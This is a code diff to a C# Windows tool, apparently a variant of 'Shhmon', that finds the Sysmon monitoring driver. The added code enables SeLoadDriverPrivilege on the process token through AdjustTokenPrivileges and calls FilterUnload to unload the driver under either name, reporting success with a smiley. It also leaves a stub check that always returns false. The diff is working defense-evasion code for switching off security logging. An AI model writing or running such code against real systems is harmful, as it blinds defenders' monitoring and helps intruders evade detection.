@@ -1,10 +1,11 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Globalization;
 using System.Runtime.InteropServices;
 using System.Text;
 
-namespace Shhmon
+namespace NewShhmon
 {
     class Program
     {
@@ -18,17 +19,63 @@ namespace Shhmon
                     if (filter.Name.Equals("SysmonDrv"))
                     {
                         Console.WriteLine("[+] Found the Sysmon driver running with default name \"SysmonDrv\"");
+                        uint status = NativeMethods.FilterUnload(filter.Name);
+                        Console.WriteLine(status);
                     }
                     else
                     {
                         Console.WriteLine("[+] Found the Sysmon driver running with alternate name \"{0}\"", filter.Name);
+                        Console.WriteLine("[+] Trying to kill the driver...");
+                        IntPtr currentProcessToken = new IntPtr();
+                        NativeMethods.OpenProcessToken(Process.GetCurrentProcess().Handle, NativeMethods.TOKEN_ALL_ACCESS, out currentProcessToken);
+                        SetTokenPrivilege(ref currentProcessToken);
+                        uint status = NativeMethods.FilterUnload(filter.Name);
+                        if (!status.Equals(0))
+                        {
+                            Console.WriteLine("[-] Driver unload failed");
+                        }
+                        else
+                        {
+                            Console.WriteLine("[+] {0} was unloaded :)", filter.Name);
+                        }
                     }
                 }
                 else
-                {
-                    Console.WriteLine("[-] Sysmon driver not found");
-                }
+                { }
             }
+            Console.ReadKey();
+        }
+
+        public static void SetTokenPrivilege(ref IntPtr hToken)
+        {
+            Console.WriteLine("[*] Adding SeLoadDriverPrivilege to token");
+            LUID luid = new LUID();
+            if (!NativeMethods.LookupPrivilegeValue(null, "SeLoadDriverPrivilege", ref luid))
+            {
+                Console.WriteLine("[-] LookupPrivilegeValue failed!");
+                return;
+            }
+            Console.WriteLine(" [+] Received LUID");
+
+            LUID_AND_ATTRIBUTES luidAndAttributes = new LUID_AND_ATTRIBUTES();
+            luidAndAttributes.Luid = luid;
+            luidAndAttributes.Attributes = 0x2; //SE_PRIVILEGE_ENABLED
+
+            TOKEN_PRIVILEGES newState = new TOKEN_PRIVILEGES();
+            newState.PrivilegeCount = 1;
+            newState.Privileges = luidAndAttributes;
+
+            TOKEN_PRIVILEGES previousState = new TOKEN_PRIVILEGES();
+            uint retLen = 0;
+            Console.WriteLine(" [*] Adjusting token");
+            if (!NativeMethods.AdjustTokenPrivileges(hToken, false, ref newState, (uint)Marshal.SizeOf(newState), ref previousState, out retLen))
+            {
+                Console.WriteLine("[-] AdjustTokenPrivileges failed!");
+                return;
+            }
+
+            Console.WriteLine(" [+] SeLoadDriverPrivilege added!");
+            return;
         }
 
         public struct FilterInfo
@@ -167,6 +214,12 @@ namespace Shhmon
             }
 
             return result;
+        }
+
+        public static bool CheckTokenPrivs()
+        {
+
+            return false;
         }
     }
 
@@ -318,7 +371,6 @@ namespace Shhmon
                 throw new InvalidOperationException("Unable to allocate or extend the buffer.", oom);
             }
         }
-
         #endregion // Private methods
     }
 
@@ -342,6 +394,28 @@ namespace Shhmon
         public const uint ErrorNotFound = 0x80070490;
         public const uint ErrorNoMoreItems = 0x80070103;
         public const uint ErrorInsufficientBuffer = 0x8007007A;
+
+        public const uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
+        public const uint STANDARD_RIGHTS_READ = 0x00020000;
+        public const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
+        public const uint TOKEN_DUPLICATE = 0x0002;
+        public const uint TOKEN_IMPERSONATE = 0x0004;
+        public const uint TOKEN_QUERY = 0x0008;
+        public const uint TOKEN_QUERY_SOURCE = 0x0010;
+        public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
+        public const uint TOKEN_ADJUST_GROUPS = 0x0040;
+        public const uint TOKEN_ADJUST_DEFAULT = 0x0080;
+        public const uint TOKEN_ADJUST_SESSIONID = 0x0100;
+        public const uint TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
+        public const uint TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
+            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
+            TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
+            TOKEN_ADJUST_SESSIONID);
+
+        public const uint SE_PRIVILEGE_ENABLED = 0x2;
+        public const uint SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1;
+        public const uint SE_PRIVILEGE_REMOVED = 0x4;
+        public const uint SE_PRIVILEGE_USED_FOR_ACCESS = 0x3;
 
         #endregion //Constants
 
@@ -396,6 +470,45 @@ namespace Shhmon
         public static extern void ZeroMemory(
             IntPtr handle,
             uint length);
+
+        [DllImport("kernel32.dll")]
+        internal static extern Boolean OpenProcessToken(IntPtr hProcess, uint dwDesiredAccess, out IntPtr hToken);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern Boolean AdjustTokenPrivileges(
+            IntPtr TokenHandle,
+            bool DisableAllPrivileges,
+            ref TOKEN_PRIVILEGES NewState,
+            uint BufferLengthInBytes,
+            ref TOKEN_PRIVILEGES PreviousState,
+            out uint ReturnLengthInBytes
+        );
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern Boolean LookupPrivilegeValue(
+            string lpSystemName,
+            string lpName,
+            ref LUID luid
+        );
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LUID_AND_ATTRIBUTES
+    {
+        public LUID Luid;
+        public uint Attributes;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LUID
+    {
+        public uint LowPart;
+        public uint HighPart;
+    }
+    public struct TOKEN_PRIVILEGES
+    {
+        public uint PrivilegeCount;
+        public LUID_AND_ATTRIBUTES Privileges;
     }
 
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
